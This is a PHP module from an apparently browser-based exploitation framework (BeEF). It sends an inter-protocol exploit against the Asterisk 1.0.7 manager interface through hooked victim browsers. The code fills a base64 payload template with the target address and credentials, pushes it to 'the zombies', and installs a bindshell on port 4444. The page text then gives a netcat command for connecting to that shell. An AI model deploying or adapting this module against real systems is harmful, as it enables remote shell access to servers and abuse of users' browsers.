<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<script>
	var rtnval = "OK Clicked";

	Element.Methods.construct_code = function() {

		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';

		// replace sections of the code with user input
		b64code = b64replace(b64code, "IP_ADDRESS", document.myform.alert_str.value);
		b64code = b64replace(b64code, "USERNAME", document.myform.username_str.value);
		b64code = b64replace(b64code, "SECRET", document.myform.secret_str.value);

		// send the code to the zombies
		do_send(b64code);
	}

	// add construct code to DOM
	Element.addMethods();
</script>

<!-- PAGE CONTENT -->
<div id="module_header">Asterisk (Inter-protocol Exploit)</div>
This module will exploit the asterisk (1.0.7) manager vulnerability from the browser. The 
payload is a bindshell on port 4444. <br><br>
The Bindshell Inter-protocol Communication module or following command will connect to the listening bindshell:
<pre>
    nc asteriskserverip 4444
</pre>
<!--<a href=http://www.bindshell.net/papers/ipe>Inter-protocol Exploitation</a><br>-->
<div id="module_subsection">
	<form name="myform">
		<div id="module_subsection_header">Target Address</div>
		<input type="text" name="alert_str" value="localhost"/>
		<div id="module_subsection_header">Username</div>
		<input type="text" name="username_str" value="mark"/>
		<div id="module_subsection_header">Secret</div>
		<input type="text" name="secret_str" value="mysecret"/>
		<input class="button" type="button" value=" Send Now " onClick="javascript:construct_code()"/>
	</form>
</div>
<div class="entry">
<br>


</div>
